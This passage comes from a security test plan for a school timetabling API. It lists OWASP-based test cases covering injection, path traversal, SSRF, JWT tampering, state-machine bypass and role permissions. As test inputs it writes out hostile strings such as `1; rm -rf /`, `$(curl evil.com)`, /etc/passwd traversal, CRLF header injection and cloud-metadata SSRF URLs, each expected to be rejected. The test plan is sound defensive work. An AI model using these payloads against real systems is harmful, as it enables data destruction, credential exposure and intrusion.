| SCH-SEC-142 | Calendar token .ics: teacher name with `<script>` → does iCal output include? (text/calendar) | Property-encoded per RFC 5545 (escape `,`, `;`, `\\n`) | P1       |           |
| SCH-SEC-143 | iCal SUMMARY field with embedded `\\nBEGIN:VEVENT\\n` (calendar injection)                    | Newlines escaped per RFC 5545; cannot inject events    | P1       |           |
| SCH-SEC-144 | Free-text `reason` on absence with `${process.env.JWT_SECRET}` — server-side template?        | Plain string, no template eval                         | P0       |           |

### 5.4 Header injection

| #           | Input                                                   | Expected                                                   | Severity | Pass/Fail |
| ----------- | ------------------------------------------------------- | ---------------------------------------------------------- | -------- | --------- |
| SCH-SEC-145 | `Accept-Language: en\\r\\nX-Injected: evil`             | HTTP layer rejects CRLF in headers                         | P1       |           |
| SCH-SEC-146 | `?token=abc%0d%0aSet-Cookie:%20evil=1` on .ics endpoint | URL-decoded in route param; not echoed back to header      | P1       |           |
| SCH-SEC-147 | `Authorization: Bearer <jwt>\\nX-Tenant-Id: <victim>`   | Header parser splits cleanly; second header dropped or 400 | P1       |           |

### 5.5 Command injection / SSRF in solver invocation

| #           | Input                                                   | Expected                                    | Severity                                          | Pass/Fail                            |
| ----------- | ------------------------------------------------------- | ------------------------------------------- | ------------------------------------------------- | ------------------------------------ | --- | --- |
| SCH-SEC-148 | Body `solver_seed: 1; rm -rf /` — seed is int-typed     | 422 Zod                                     | P0                                                |                                      |
| SCH-SEC-149 | Pin reason with shell metacharacters `$(curl evil.com)` | Persisted verbatim; never passed to a shell | P0                                                |                                      |
| SCH-SEC-150 | `grep -rn 'exec(\\                                      | spawn(\\                                    | child_process' apps/api/src/modules/scheduling\*` | Zero shell exec in scheduling module | P0  |     |

### 5.6 Path traversal (calendar token, JSONB key paths)

| #           | Input                                                                             | Expected                                       | Severity | Pass/Fail |
| ----------- | --------------------------------------------------------------------------------- | ---------------------------------------------- | -------- | --------- |
| SCH-SEC-151 | `GET /v1/calendar/{tenantId}/../../etc/passwd.ics`                                | 404 (path normalization at edge / Nest router) | P0       |           |
| SCH-SEC-152 | `GET /v1/calendar/{tenantId}/%2e%2e%2f%2e%2e%2fetc%2fpasswd.ics`                  | 404                                            | P0       |           |
| SCH-SEC-153 | `GET /v1/calendar/{tenantId}/..%5c..%5cwindows%5cwin.ini.ics`                     | 404                                            | P0       |           |
| SCH-SEC-154 | Body field `entity_id: '../../another-tenant/teacher-id'` on calendar-tokens POST | UUID validator rejects                         | P0       |           |

### 5.7 Long-string / unicode normalization DoS

| #           | Input                                                                           | Expected                                                           | Severity | Pass/Fail |
| ----------- | ------------------------------------------------------------------------------- | ------------------------------------------------------------------ | -------- | --------- |
| SCH-SEC-155 | `pin_reason` 10MB string                                                        | 413 Payload Too Large (body cap)                                   | P1       |           |
| SCH-SEC-156 | `pin_reason` 1MB string                                                         | 422 Zod max length (verify cap exists ≤ 500 chars)                 | P1       |           |
| SCH-SEC-157 | `cancellation_reason` 100k unicode chars                                        | 422 Zod max(500)                                                   | P1       |           |
| SCH-SEC-158 | Unicode normalization attack: `pin_reason` with NFC/NFKC equivalence collisions | Persisted; no DoS; uniqueness checks (if any) use NFC consistently | P2       |           |

### 5.8 Cross-field invariants — deliberate violations

| #           | Input                                                                                                          | Expected                                              | Severity | Pass/Fail |
| ----------- | -------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------- | -------- | --------- |
| SCH-SEC-159 | `POST /v1/scheduling/absences` body `{date: '2026-05-10', date_to: '2026-05-09'}`                              | 422 Zod refine (date_to >= date)                      | P1       |           |
| SCH-SEC-160 | `POST /v1/scheduling/absences` body `{full_day: false, period_from: 7, period_to: 3}`                          | 422 Zod refine (period_to >= period_from)             | P1       |           |
| SCH-SEC-161 | `POST /v1/scheduling/exam-sessions` body `{start_date: '2026-12-01', end_date: '2026-11-01'}`                  | 422 Zod refine                                        | P1       |           |
| SCH-SEC-162 | `PUT /v1/scheduling/rotation` body `{cycle_length: 4, week_labels: ['A','B']}` (length mismatch)               | 422 Zod refine                                        | P1       |           |
| SCH-SEC-163 | `POST /v1/scheduling/curriculum-requirements` body `{min_periods_per_week: 10, preferred: 5}`                  | 422 (preferred >= min)                                | P1       |           |
| SCH-SEC-164 | `POST /v1/scheduling/curriculum-requirements` body `{requires_double_period: true, double_period_count: null}` | 422 (count required when requires_double_period)      | P1       |           |
| SCH-SEC-165 | `POST /v1/scheduling/curriculum-requirements` body `{min_periods_per_week: 0}` (below min 1)                   | 422                                                   | P1       |           |
| SCH-SEC-166 | `POST /v1/scheduling/curriculum-requirements` body `{min_periods_per_week: 100}` (above max 35)                | 422                                                   | P1       |           |
| SCH-SEC-167 | `POST /v1/scheduling/curriculum-requirements` body `{period_duration: 5}` (below min 10)                       | 422                                                   | P1       |           |
| SCH-SEC-168 | `POST /v1/scheduling/curriculum-requirements` body `{period_duration: 9999}` (above max 180)                   | 422                                                   | P1       |           |
| SCH-SEC-169 | `POST /v1/scheduling/teacher-competencies/bulk` body `{competencies: [<501 entries>]}`                         | 422 (max 500)                                         | P1       |           |
| SCH-SEC-170 | `POST /v1/scheduling/curriculum-requirements/bulk-upsert` body `{...: 101 entries}`                            | 422 (max 100)                                         | P1       |           |
| SCH-SEC-171 | `POST /v1/scheduling/teacher-competencies/copy-to-years` body `{targets: [<51 entries>]}`                      | 422 (max 50)                                          | P1       |           |
| SCH-SEC-172 | `POST /v1/scheduling/absences` body `{date: '1900-01-01'}`                                                     | Accepted or 422 (document policy)                     | P2       |           |
| SCH-SEC-173 | `POST /v1/scheduling/absences` body `{date: '9999-12-31'}`                                                     | Accepted or 422                                       | P2       |           |
| SCH-SEC-174 | `POST /v1/scheduling/absences` body `{date: 'not-a-date'}`                                                     | 422                                                   | P1       |           |
| SCH-SEC-175 | `POST /v1/scheduling/absences` body `{period_from: -1}`                                                        | 422 (negative)                                        | P1       |           |
| SCH-SEC-176 | UUID malformed: `?academic_year_id=12345`                                                                      | 422 (invalid uuid)                                    | P1       |           |
| SCH-SEC-177 | UUID right shape but never-existed: `?academic_year_id=00000000-0000-0000-0000-000000000000`                   | 200 with empty result OR 404 (consistent with module) | P2       |           |

---

## 6. OWASP Top 10 — A04 Insecure Design

Scheduling's most insecure-design risk is the **solver sidecar**: a long-running CPU-bound process that an attacker can chain to exhaust worker capacity, starve other tenants, or DoS the entire scheduling pipeline.

### 6.1 Solver-resource abuse / DoS-by-design

| #           | Scenario                                                                                                    | Expected                                                                            | Severity | Pass/Fail |
| ----------- | ----------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------- | -------- | --------- |
| SCH-SEC-178 | Trigger 100 concurrent solver runs from one tenant                                                          | Only one queued/running run per `academic_year_id` per tenant (CONFLICT 409)        | P0       |           |
| SCH-SEC-179 | Trigger 100 concurrent solver runs across 100 academic_year_ids in one tenant                               | All accepted but worker concurrency = 1 ⇒ serialized; documented backpressure       | P1       |           |
| SCH-SEC-180 | Set `tenant_scheduling_settings.max_solver_duration = 99999` then trigger run                               | Server clamps to documented ceiling (e.g. 3600s) — verify clamp exists              | P0       |           |
| SCH-SEC-181 | Trigger run with config_snapshot crafted to make solver explore worst-case branching (NP-hard hostile data) | Solver respects max_solver_duration; falls back to feasible-not-optimal in N sec    | P1       |           |
| SCH-SEC-182 | Pin schedules that are mutually impossible (e.g. teacher T pinned to 2 places at same period)               | Solver fails fast with `failure_reason: PIN_CONFLICT`; run marked failed in seconds | P1       |           |
| SCH-SEC-183 | Pin every schedule possible, then run solver                                                                | Solver completes immediately (no degrees of freedom); no infinite loop              | P1       |           |
| SCH-SEC-184 | Bulk-pin 1,000,000 schedules in one POST                                                                    | Zod refine max array size; 422                                                      | P1       |           |
| SCH-SEC-185 | Trigger run, immediately cancel; repeat 1,000 times in 1 minute                                             | Cancel idempotent; no zombie jobs in BullMQ; no DB row leak                         | P1       |           |

### 6.2 State machine bypass

| #           | Scenario                                                                                   | Expected                              | Severity | Pass/Fail |
| ----------- | ------------------------------------------------------------------------------------------ | ------------------------------------- | -------- | --------- |
| SCH-SEC-186 | `POST /v1/scheduling-runs/{id}/apply` on a `queued` run                                    | 409 RUN_NOT_COMPLETE                  | P0       |           |
| SCH-SEC-187 | `POST /v1/scheduling-runs/{id}/apply` on a `running` run                                   | 409                                   | P0       |           |
| SCH-SEC-188 | `POST /v1/scheduling-runs/{id}/apply` on a `failed` run                                    | 409                                   | P0       |           |
| SCH-SEC-189 | `POST /v1/scheduling-runs/{id}/apply` on an already-`applied` run                          | 409 ALREADY_APPLIED                   | P0       |           |
| SCH-SEC-190 | `POST /v1/scheduling-runs/{id}/discard` on a `queued` run                                  | 409 (only completed discardable)      | P1       |           |
| SCH-SEC-191 | `POST /v1/scheduling-runs/{id}/cancel` on a `completed` run                                | 409 (only queued/running cancellable) | P1       |           |
| SCH-SEC-192 | `POST /v1/scheduling-runs/{id}/cancel` on an `applied` run                                 | 409                                   | P0       |           |
| SCH-SEC-193 | `PATCH /v1/scheduling-runs/{id}/adjustments` on a `failed` run                             | 409                                   | P1       |           |
| SCH-SEC-194 | Try to write directly to `scheduling_run.status='completed'` via any controller body field | Field ignored (mass-assignment guard) | P0       |           |
| SCH-SEC-195 | `POST /v1/scheduling/absences/{id}/cancel` on already-cancelled absence                    | 409 ALREADY_CANCELLED                 | P1       |           |
| SCH-SEC-196 | Double-`POST /v1/scheduling/offers/{id}/accept` on same offer                              | 409 ALREADY_ACCEPTED (idempotency)    | P1       |           |
| SCH-SEC-197 | `POST /v1/scheduling/offers/{id}/accept` on a `revoked` offer                              | 409 OFFER_REVOKED                     | P1       |           |
| SCH-SEC-198 | `POST /v1/scheduling/offers/{id}/decline` after accept                                     | 409                                   | P1       |           |
| SCH-SEC-199 | `POST /v1/scheduling/exam-sessions/{id}/publish` on already-`published` session            | 409 ALREADY_PUBLISHED                 | P1       |           |
| SCH-SEC-200 | `PUT /v1/scheduling/exam-sessions/{id}` after publish (modify name/dates)                  | 409 PUBLISHED_IMMUTABLE               | P0       |           |
| SCH-SEC-201 | `DELETE /v1/scheduling/exam-sessions/{id}` after publish                                   | 409                                   | P0       |           |

### 6.3 Concurrency / race conditions

| #           | Scenario                                                                            | Expected                                                                                  | Severity | Pass/Fail |
| ----------- | ----------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------- | -------- | --------- |
| SCH-SEC-202 | Two parallel `POST /v1/scheduling-runs` with same `academic_year_id`                | One succeeds, one 409 (DB unique partial index OR app-level check)                        | P0       |           |
| SCH-SEC-203 | Two parallel `POST /v1/scheduling-runs/{id}/apply` for same completed run           | One succeeds (status→applied), other 409 OPTIMISTIC_LOCK_MISMATCH (`expected_updated_at`) | P0       |           |
| SCH-SEC-204 | Two parallel `POST /v1/scheduling/offers/{id}/accept` from same teacher in two tabs | One succeeds, other 409                                                                   | P1       |           |
| SCH-SEC-205 | Concurrent offer accept by different teachers for same absence (race)               | Only one becomes confirmed substitute; other → declined or 409                            | P0       |           |
| SCH-SEC-206 | Solver run completes while user is mid-`/cancel`                                    | Apply state-transition guard (queued/running only); return 409 if completed               | P1       |           |

### 6.4 Solver-output integrity

| #           | Scenario                                                                                              | Expected                                                   | Severity | Pass/Fail |
| ----------- | ----------------------------------------------------------------------------------------------------- | ---------------------------------------------------------- | -------- | --------- |
| SCH-SEC-207 | Tamper `scheduling_run.result_json` directly via `psql` (privileged action), then `apply`             | Apply re-validates `result_json` schema; rejects malformed | P1       |           |
| SCH-SEC-208 | Result_json contains schedule entries with cross-tenant `staff_profile_id` — apply attempts FK insert | FK constraint fails; entire transaction rolls back         | P0       |           |
| SCH-SEC-209 | Result_json contains negative period_order                                                            | Apply validates; rejects                                   | P1       |           |
| SCH-SEC-210 | Result_json size > 50MB                                                                               | Read endpoint streams safely; no OOM                       | P2       |           |

---

## 7. OWASP Top 10 — A05 Security Misconfiguration

| #           | Assertion                                                                                                                           | Expected                                               | Severity | Pass/Fail |
| ----------- | ----------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------ | -------- | --------- |
| SCH-SEC-211 | Default credentials: no default admin accounts on fresh tenant                                                                      | Verified                                               | P0       |           |
| SCH-SEC-212 | Directory listing disabled at edge (Caddy / nginx)                                                                                  | 404 on directory roots                                 | P1       |           |
| SCH-SEC-213 | Error responses do NOT expose stack traces in production (`NODE_ENV=production`)                                                    | Generic `{code, message}` only                         | P1       |           |
| SCH-SEC-214 | A scheduling endpoint that throws unexpected exception (e.g., apply on corrupted run) returns generic 500, not Prisma error message | Verified                                               | P0       |           |
| SCH-SEC-215 | `X-Powered-By` header absent (or set to non-revealing string)                                                                       | Verified                                               | P2       |           |
| SCH-SEC-216 | `Server` header does not reveal NestJS version                                                                                      | Verified                                               | P2       |           |
| SCH-SEC-217 | `NODE_ENV=production` in production                                                                                                 | Yes                                                    | P1       |           |
| SCH-SEC-218 | NestJS Swagger / OpenAPI UI not exposed in prod (would reveal full endpoint inventory)                                              | 404 at `/api`, `/swagger`, `/docs`                     | P1       |           |
| SCH-SEC-219 | `.env`, `.git/`, `/admin-panel`, `/.well-known/security.txt` checks                                                                 | 404 except security.txt (which should exist)           | P1       |           |
| SCH-SEC-220 | Prisma Studio NOT exposed in prod                                                                                                   | Yes                                                    | P0       |           |
| SCH-SEC-221 | BullMQ Bull Board UI (if installed) NOT public — auth-gated to admin                                                                | 401 / 404                                              | P0       |           |
| SCH-SEC-222 | Solver sidecar `:5557` NOT reachable from public internet (firewall / loopback bind)                                                | Confirmed via external `nmap` scan                     | P0       |           |
| SCH-SEC-223 | Postgres `:5432` NOT reachable from public internet                                                                                 | Confirmed                                              | P0       |           |
| SCH-SEC-224 | Redis `:6379` NOT reachable from public internet                                                                                    | Confirmed                                              | P0       |           |
| SCH-SEC-225 | Default tenant: no "platform" tenant accessible from school-facing URL                                                              | Verified                                               | P1       |           |
| SCH-SEC-226 | No verbose `?debug=true` query param shortcut anywhere in scheduling routes                                                         | Verified                                               | P1       |           |
| SCH-SEC-227 | Rate limits configured on solver-trigger endpoint (POST /v1/scheduling-runs)                                                        | At least 10/min/tenant — verify ratelimit guard exists | P1       |           |
| SCH-SEC-228 | Rate limits on calendar-token .ics endpoint (per token)                                                                             | E.g., 60/min per token                                 | P1       |           |

---

## 8. OWASP Top 10 — A06 Vulnerable & Outdated Components

The Scheduling module's unique component-supply-chain risk is **Google OR-Tools (CP-SAT)** running inside the Python solver sidecar. OR-Tools has had CVEs in the past (see GHSA-vh3r-3w65-r6c5 historical advisories).

| #           | Assertion                                                                                         | Expected                   | Severity | Pass/Fail |
| ----------- | ------------------------------------------------------------------------------------------------- | -------------------------- | -------- | --------- |
| SCH-SEC-229 | `pnpm audit --prod` in `apps/api` — zero high/critical                                            | Zero                       | P0       |           |
| SCH-SEC-230 | `pnpm audit --prod` in `apps/worker` — zero high/critical                                         | Zero                       | P0       |           |
| SCH-SEC-231 | `pnpm audit --prod` in `apps/web` — zero high/critical                                            | Zero                       | P0       |           |
| SCH-SEC-232 | `pnpm audit --prod` in `packages/shared` (where solver client lives) — zero high/critical         | Zero                       | P0       |           |
| SCH-SEC-233 | Python solver sidecar — `pip-audit` zero high/critical (OR-Tools, FastAPI/Flask, requests pinned) | Zero                       | P0       |           |
| SCH-SEC-234 | OR-Tools version pinned in `solver/requirements.txt` (no `>=` ranges)                             | Verified — exact `==` pin  | P1       |           |
| SCH-SEC-235 | Solver sidecar Docker image rebuilt monthly with security patches                                 | CI cron rebuild documented | P1       |           |
| SCH-SEC-236 | `@nestjs/*`, `prisma`, `bullmq`, `ioredis`, `zod` all within 12 months of latest                  | Verified                   | P1       |           |
| SCH-SEC-237 | `next` framework on supported branch (no critical advisories)                                     | Verified                   | P1       |           |
| SCH-SEC-238 | Snyk / Dependabot alerts zero-outstanding on scheduling-touched paths                             | Verified                   | P1       |           |
| SCH-SEC-239 | No deprecated packages without replacement plan                                                   | Reviewed                   | P2       |           |
| SCH-SEC-240 | Solver sidecar Python version supported (≥ 3.10, not EOL)                                         | Verified                   | P1       |           |

---

## 9. OWASP Top 10 — A07 Identification & Authentication Failures

| #           | Attempt                                                                                                 | Expected                                                                        | Severity | Pass/Fail |
| ----------- | ------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------- | -------- | --------- |
| SCH-SEC-241 | Brute-force login 1,000 attempts from single IP (general auth, but blocks scheduling access)            | Rate-limited after N attempts                                                   | P1       |           |
| SCH-SEC-242 | JWT with `alg=none` posted to `/v1/scheduling-runs`                                                     | 401 INVALID_TOKEN                                                               | P0       |           |
| SCH-SEC-243 | JWT with `alg=HS256` but tampered payload (re-signed with wrong key)                                    | 401                                                                             | P0       |           |
| SCH-SEC-244 | JWT with confused-deputy `alg=RS256` payload signed using public key as HMAC secret                     | 401 (algorithm allow-list pinned)                                               | P0       |           |
| SCH-SEC-245 | Expired JWT → API returns 401                                                                           | 401                                                                             | P0       |           |
| SCH-SEC-246 | Long-running solver run (3600s); JWT expires mid-run                                                    | Worker job continues (server-side; no JWT needed); user UI re-auths via refresh | P0       |           |
| SCH-SEC-247 | User polls `/v1/scheduling-runs/{id}/progress` after JWT expires                                        | 401; client refreshes; new JWT → 200                                            | P0       |           |
| SCH-SEC-248 | Logout (`POST /v1/auth/logout`) immediately invalidates refresh token; subsequent refresh attempt → 401 | Verified                                                                        | P0       |           |
| SCH-SEC-249 | Logout invalidates session; next request to `/v1/scheduling-runs` with old access JWT                   | Access JWT remains valid until expiry (documented limit); refresh denied        | P1       |           |
| SCH-SEC-250 | Refresh-token rotation: using an old refresh token after rotation invalidates entire family             | Yes; subsequent refresh from any device in family → 401                         | P1       |           |
| SCH-SEC-251 | JWT stored in localStorage anywhere in `apps/web` scheduling pages?                                     | No — memory only; refresh token in httpOnly cookie                              | P0       |           |
| SCH-SEC-252 | Multi-tenant impersonation: school_owner in tenant A gets JWT minted for tenant B                       | Impossible — JWT mints `tenant_id` from session at login                        | P0       |           |
| SCH-SEC-253 | MFA gating: solver-run trigger (high-risk action) requires MFA-step-up?                                 | Documented decision — currently not required; flag as P2                        | P2       |           |
| SCH-SEC-254 | MFA gating: `apply` (writes to live timetable) requires MFA-step-up?                                    | Documented; not required currently; flag as P2                                  | P2       |           |
| SCH-SEC-255 | MFA gating: emergency-change (writes immediate schedule) requires MFA-step-up?                          | Documented; flag as P2                                                          | P2       |           |
| SCH-SEC-256 | Session fixation: login invalidates any pre-existing session ID                                         | Verified                                                                        | P1       |           |
| SCH-SEC-257 | Password-reset token: single-use, time-limited                                                          | Verified                                                                        | P1       |           |
| SCH-SEC-258 | Calendar token (long-lived bearer) — does it grant any write access?                                    | No — read-only `.ics`                                                           | P0       |           |
| SCH-SEC-259 | Calendar token survives password reset?                                                                 | Yes — out-of-band token, decoupled (documented limit)                           | P2       |           |
| SCH-SEC-260 | Account lockout after failed accept-offer attempts? (not standard; document)                            | Not lockout-relevant; no pass/fail just doc                                     | —        |           |

---

## 10. OWASP Top 10 — A08 Software & Data Integrity Failures

| #           | Assertion                                                                                           | Expected                                                                       | Severity | Pass/Fail |
| ----------- | --------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------ | -------- | --------- |
| SCH-SEC-261 | CI builds produce signed artefacts (or signed Git tags) for releases                                | Documented                                                                     | P2       |           |
| SCH-SEC-262 | Dependency lockfile (`pnpm-lock.yaml`) committed and matches installed                              | Verified                                                                       | P1       |           |
| SCH-SEC-263 | Solver sidecar Docker image signed (cosign / Notary) and verified at deploy                         | Documented                                                                     | P1       |           |
| SCH-SEC-264 | Solver-input → solver-output integrity: solver returns deterministic output for same `solver_seed`  | Verified — same seed ⇒ same result_json structure                              | P1       |           |
| SCH-SEC-265 | Solver-output round-trip: `result_json` cannot be tampered between worker write and apply read      | Apply re-fetches from DB (single source of truth); validates schema            | P0       |           |
| SCH-SEC-266 | `scheduling_run.applied_at` and `applied_by_user_id` are server-set, never client-controllable      | Verified                                                                       | P0       |           |
| SCH-SEC-267 | `scheduling_run.failure_reason` cannot be set by client                                             | Verified                                                                       | P1       |           |
| SCH-SEC-268 | `scheduling_run.solver_duration_ms` cannot be tampered by client                                    | Verified                                                                       | P1       |           |
| SCH-SEC-269 | Audit log for apply/discard cannot be tampered (append-only, no UPDATE/DELETE path exposed)         | Verified                                                                       | P0       |           |
| SCH-SEC-270 | Pin/unpin audit (who + when + why) immutable                                                        | Verified                                                                       | P1       |           |
| SCH-SEC-271 | Substitution offer accept/decline log immutable                                                     | Verified                                                                       | P1       |           |
| SCH-SEC-272 | `expected_updated_at` optimistic lock: tampered/old value → 409                                     | Verified                                                                       | P0       |           |
| SCH-SEC-273 | Worker idempotency: replaying same `scheduling:solve-v2` job (same run_id) twice                    | Conditional claim (queued→running) ensures only one execution; second is no-op | P0       |           |
| SCH-SEC-274 | Worker `updateMany(where: {id, status: 'running'})` prevents writing result_json to wrong-state row | Verified — atomic                                                              | P0       |           |
| SCH-SEC-275 | Stale-reaper does NOT clobber a run that worker is finishing (race between reaper and worker)       | Reaper only fails runs older than max_solver_duration + 60s buffer             | P1       |           |

---

## 11. OWASP Top 10 — A09 Security Logging & Monitoring Failures

| #           | Assertion                                                                                                                      | Expected                         | Severity | Pass/Fail |
| ----------- | ------------------------------------------------------------------------------------------------------------------------------ | -------------------------------- | -------- | --------- |
| SCH-SEC-276 | `POST /v1/scheduling-runs` (trigger) writes audit_log: `{action: 'scheduling_run.create', tenant_id, user_id, run_id}`         | Verified                         | P0       |           |
| SCH-SEC-277 | `POST /v1/scheduling-runs/{id}/apply` writes audit_log with run_id, schedules-affected count                                   | Verified                         | P0       |           |
| SCH-SEC-278 | `POST /v1/scheduling-runs/{id}/discard` writes audit_log                                                                       | Verified                         | P1       |           |
| SCH-SEC-279 | `POST /v1/scheduling-runs/{id}/cancel` writes audit_log                                                                        | Verified                         | P1       |           |
| SCH-SEC-280 | `POST /v1/schedules/{id}/pin` writes audit_log with pin_reason                                                                 | Verified                         | P1       |           |
| SCH-SEC-281 | `POST /v1/scheduling/swaps/execute` writes audit_log                                                                           | Verified                         | P0       |           |
| SCH-SEC-282 | `POST /v1/scheduling/emergency-change` writes audit_log with reason                                                            | Verified                         | P0       |           |
| SCH-SEC-283 | `POST /v1/scheduling/absences` writes audit_log                                                                                | Verified                         | P1       |           |
| SCH-SEC-284 | `POST /v1/scheduling/substitutions` writes audit_log                                                                           | Verified                         | P1       |           |
| SCH-SEC-285 | `POST /v1/scheduling/exam-sessions/{id}/publish` writes audit_log                                                              | Verified                         | P1       |           |
| SCH-SEC-286 | `POST /v1/scheduling/calendar-tokens` writes audit_log (token created)                                                         | Verified                         | P1       |           |
| SCH-SEC-287 | `DELETE /v1/scheduling/calendar-tokens/{id}` writes audit_log                                                                  | Verified                         | P1       |           |
| SCH-SEC-288 | Failed permission check (e.g., teacher attempts run trigger) writes audit_log: `{action: 'permission_denied', endpoint, role}` | Verified                         | P1       |           |
| SCH-SEC-289 | Failed login attempts logged                                                                                                   | Verified                         | P1       |           |
| SCH-SEC-290 | Worker `scheduling:solve-v2` logs run_id + tenant_id at start and end                                                          | Verified                         | P1       |           |
| SCH-SEC-291 | Worker dead-letter alerts after > 10 entries on `scheduling` queue                                                             | Sentry / Prometheus alert fires  | P1       |           |
| SCH-SEC-292 | Solver canary SLA (5 min) — alert if scheduling queue lag > 5 min                                                              | Per inventory line 49 — verified | P1       |           |
| SCH-SEC-293 | Stale-reaper failures logged with run_id                                                                                       | Verified                         | P1       |           |
| SCH-SEC-294 | PII in logs: staff names, student names NOT logged in scheduling logs (only IDs)                                               | Verified — log review            | P0       |           |
| SCH-SEC-295 | Solver `result_json` NOT logged in entirety (could leak full schedule)                                                         | Verified                         | P1       |           |
| SCH-SEC-296 | Audit log retention ≥ 7 years (per governance policy)                                                                          | Verified in log sink config      | P1       |           |
| SCH-SEC-297 | Audit log entries include `tenant_id` for forensic isolation                                                                   | Verified                         | P0       |           |
| SCH-SEC-298 | iCal token usage logged (each fetch hit) at info level — disable in prod due to volume but available on demand                 | Documented decision              | P2       |           |

---

## 12. OWASP Top 10 — A10 Server-Side Request Forgery

The solver sidecar URL `SOLVER_PY_URL` is the unique SSRF surface. If an attacker can coerce the API to dispatch requests to arbitrary URLs, they can pivot to internal services (Postgres, Redis, Hetzner metadata at `169.254.169.254`).

| #           | Attempt                                                                                                              | Expected                                                                   | Severity | Pass/Fail |
| ----------- | -------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------- | -------- | --------- |
| SCH-SEC-299 | `SOLVER_PY_URL` is read from env at boot ONLY; never accepts client override (no body field, no header)              | Verified by `grep -rn 'SOLVER_PY_URL' apps/`                               | P0       |           |
| SCH-SEC-300 | Trigger run with body `{academic_year_id, solver_url: 'http://evil.com/leak'}`                                       | `solver_url` ignored (Zod strips); request goes to env-configured URL      | P0       |           |
| SCH-SEC-301 | Trigger run with header `X-Solver-Url: http://169.254.169.254/latest/meta-data/`                                     | Header ignored                                                             | P0       |           |
| SCH-SEC-302 | `SOLVER_PY_URL` env value validated at boot (must be `http://localhost:*` OR `https://solver-internal.*`)            | Allow-list check at startup                                                | P1       |           |
| SCH-SEC-303 | If solver returns `Location: http://evil.com` redirect, API client must NOT follow                                   | `solveViaCpSatV3` HTTP client with `redirect: 'manual'` or follow disabled | P0       |           |
| SCH-SEC-304 | Solver-input `config_snapshot` includes URL fields? Inventory says no — verify zero `<url>` fields in payload schema | Verified — schema review                                                   | P0       |           |
| SCH-SEC-305 | iCal generator never fetches external resources (no `<img>`, no remote `URL:` in VEVENT)                             | Verified — pure text generation                                            | P0       |           |
| SCH-SEC-306 | Diagnostics-i18n translator never fetches external translation files at runtime                                      | All translations bundled at build                                          | P1       |           |
| SCH-SEC-307 | Cross-tenant solver invocation: tenant A's job cannot trigger solver for tenant B (RLS context in `TenantAwareJob`)  | Verified                                                                   | P0       |           |
| SCH-SEC-308 | DNS-rebinding attack against `SOLVER_PY_URL`: hostname resolves to external IP after rebind                          | Mitigated by env value being IP literal (`127.0.0.1`) OR DNS-pinning       | P1       |           |
| SCH-SEC-309 | Solver sidecar `:5557` bound to `127.0.0.1` only (not `0.0.0.0`)                                                     | Verified via `ss -tlnp` on production server                               | P0       |           |
| SCH-SEC-310 | If solver behind reverse proxy: proxy rejects requests with `Host: evil.com`                                         | Documented                                                                 | P2       |           |

---

## 13. Permission Matrix — Every Endpoint × Every Role (Hostile)

This matrix re-tests **every cell** from the integration spec under hostile conditions: tampered headers, reused JWTs, race conditions. It exists because A01 issues compound when matrix cells silently regress.

**Roles tested:** `school_owner` (SO), `school_principal` (SP), `school_vice_principal` (VP), `school_admin` (A), `teacher` (T), `front_office` (FO), `accounting` (AC), `parent` (P), `student` (S), `unauth` (U).

**Legend:** `200/201` = success; `403` = forbidden; `404` = not found (for owner-mismatch); `401` = unauthenticated.

### 13.1 Scheduling Runs

| #           | Endpoint                                          | SO  | SP  | VP  | A   | T   | FO  | AC  | P   | S   | U   |
| ----------- | ------------------------------------------------- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| SCH-SEC-311 | GET /v1/scheduling-runs/prerequisites             | 200 | 200 | 200 | 200 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-312 | GET /v1/scheduling-runs/feasibility               | 200 | 200 | 200 | 200 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-313 | POST /v1/scheduling-runs                          | 201 | 201 | 201 | 201 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-314 | GET /v1/scheduling-runs                           | 200 | 200 | 200 | 200 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-315 | GET /v1/scheduling-runs/:id                       | 200 | 200 | 200 | 200 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-316 | GET /v1/scheduling-runs/:id/progress              | 200 | 200 | 200 | 200 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-317 | GET /v1/scheduling-runs/:id/diagnostics           | 200 | 200 | 200 | 200 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-318 | POST /v1/scheduling-runs/:id/diagnostics/simulate | 200 | 200 | 200 | 200 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-319 | POST /v1/scheduling-runs/:id/diagnostics/refresh  | 200 | 200 | 200 | 200 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-320 | POST /v1/scheduling-runs/:id/cancel               | 200 | 200 | 200 | 200 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-321 | PATCH /v1/scheduling-runs/:id/adjustments         | 200 | 200 | 200 | 200 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-322 | POST /v1/scheduling-runs/:id/apply                | 200 | 200 | 200 | 200 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-323 | POST /v1/scheduling-runs/:id/discard              | 200 | 200 | 200 | 200 | 403 | 403 | 403 | 403 | 403 | 401 |

### 13.2 Schedules / Timetables

| #           | Endpoint                                      | SO  | SP  | VP  | A   | T            | FO  | AC  | P                        | S   | U   |
| ----------- | --------------------------------------------- | --- | --- | --- | --- | ------------ | --- | --- | ------------------------ | --- | --- |
| SCH-SEC-324 | POST /v1/schedules                            | 201 | 201 | 201 | 201 | 403          | 403 | 403 | 403                      | 403 | 401 |
| SCH-SEC-325 | GET /v1/schedules                             | 200 | 200 | 200 | 200 | 403          | 403 | 403 | 403                      | 403 | 401 |
| SCH-SEC-326 | GET /v1/schedules/:id                         | 200 | 200 | 200 | 200 | 403          | 403 | 403 | 403                      | 403 | 401 |
| SCH-SEC-327 | PATCH /v1/schedules/:id                       | 200 | 200 | 200 | 200 | 403          | 403 | 403 | 403                      | 403 | 401 |
